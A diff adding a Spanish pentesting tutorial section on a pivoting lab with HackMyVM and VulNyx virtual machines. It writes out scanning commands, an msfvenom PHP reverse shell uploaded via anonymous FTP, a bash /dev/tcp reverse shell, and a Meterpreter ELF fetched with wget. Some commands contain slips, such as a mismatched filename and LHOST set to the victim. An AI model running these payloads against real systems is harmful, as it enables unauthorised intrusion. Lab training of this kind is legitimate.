@@ -166,3 +166,128 @@ run
 ```
 
 Abrimos el navegador con la IP de la máquina Windows 7 con el puerto 5000 porque es donde me he traído el puerto 80.
+
+## Preparación del Laboratorio de Pivoting en Linux
+
+{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly" %}
+
+{% embed url="https://vulnyx.com/#basic" %}
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-11-06 163901.png" alt=""><figcaption></figcaption></figure>
+
+### Configuración de Red en VirtualBox
+
+Para crear una red en VirtualBox y configurar las máquinas necesarias, sigue estos pasos:
+
+1. **Creación de Red NAT**:
+   * Ve a **Archivo** > **Herramientas** > **Administrador de red**.
+   * Crea una red NAT con el nombre `Red_Pivoting` y asigna la dirección IP `10.10.10.0/24`.
+2. **Configuración de Máquinas Virtuales**:
+   * **Máquina Kali**:
+     * En la configuración de red, elige **Adaptador puente** para el único adaptador de red activo.
+   * **Máquina Friendly** (Máquina intermedia):
+     * Configura el **primer adaptador** como **Adaptador puente**.
+     * Configura el **segundo adaptador** en modo **Red NAT** y selecciona la red `Red_Pivoting`.
+   * **Máquina Basic** (Máquina final):
+     * Activa solo un adaptador de red y configúralo en modo **Red NAT**, seleccionando la red `Red_Pivoting`.
+3. **Iniciar Máquinas**:
+   * Con las configuraciones completadas, inicia las máquinas en el orden necesario.
+
+### Detección y Exploración de Vulnerabilidades
+
+#### Paso 1: Identificación de la Máquina Objetivo
+
+Desde la máquina Kali, ejecuta el siguiente comando para identificar dispositivos en la red local:
+
+```bash
+arp-scan -I eth0 --localnet
+```
+
+#### Paso 2: Escaneo de Vulnerabilidades con Nmap
+
+Realiza un escaneo con Nmap en la máquina objetivo para detectar posibles vulnerabilidades. Utiliza el siguiente comando:
+
+```bash
+nmap -p- -sS -sC -sV --open --min-rate=5000 -vvv -n -Pn <IP máquina víctima>
+```
+
+En los resultados, se observa que los puertos **80** y **21** están abiertos.
+
+### Acceso a la Máquina Vulnerable
+
+#### Paso 1: Exploración del Servicio FTP
+
+El puerto **21** (FTP) está abierto, permitiendo autenticación con el usuario `anonymous` y una contraseña en blanco (comportamiento predeterminado).
+
+#### Paso 2: Creación del Payload
+
+Genera un payload para obtener acceso remoto con `msfvenom`:
+
+```bash
+msfvenom -p php/reverse_php LHOST=<IP máquina víctima> LPORT=443 -f raw > pwnws.php
+```
+
+#### Paso 3: Subida del Payload
+
+Accede al servicio FTP y sube el payload utilizando el siguiente comando:
+
+```bash
+put pwned.php
+```
+
+#### Paso 4: Configuración de Escucha
+
+Pon el puerto 443 en escucha para recibir la conexión inversa:
+
+```bash
+nc -nlvp 443
+```
+
+#### Paso 5: Carga del Payload
+
+Para activar el payload y obtener acceso, visita la siguiente URL:
+
+```arduino
+http://<IP máquina víctima>/pwned.php
+```
+
+### Estabilización de la Conexión y Creación de Payload para Meterpreter
+
+#### Paso 1: Estabilización de la Conexión
+
+Dado que la conexión inicial no es estable, creamos una nueva escucha en el puerto **444**:
+
+```bash
+nc -nlvp 444
+```
+
+Luego, transferimos la sesión del puerto **443** al **444** con el siguiente comando:
+
+```bash
+bash -c "sh -i >& /dev/tcp/<IP máquina atacante>/444 0>&1"
+```
+
+#### Paso 2: Creación de un Payload para Meterpreter
+
+Para mejorar el control sobre la máquina, generamos un payload de Meterpreter con `msfvenom`:
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
+```
+
+#### Paso 3: Compartir el Payload
+
+Inicia un servidor web en Python para facilitar la transferencia del archivo malicioso a la máquina víctima:
+
+```bash
+python3 -m http.server 80
+```
+
+#### Paso 4: Descargar el Payload en la Máquina Víctima
+
+Desde la sesión activa en la máquina víctima, descarga el payload usando `wget`:
+
+```bash
+wget http://1.2.3.4/virus
+```
+
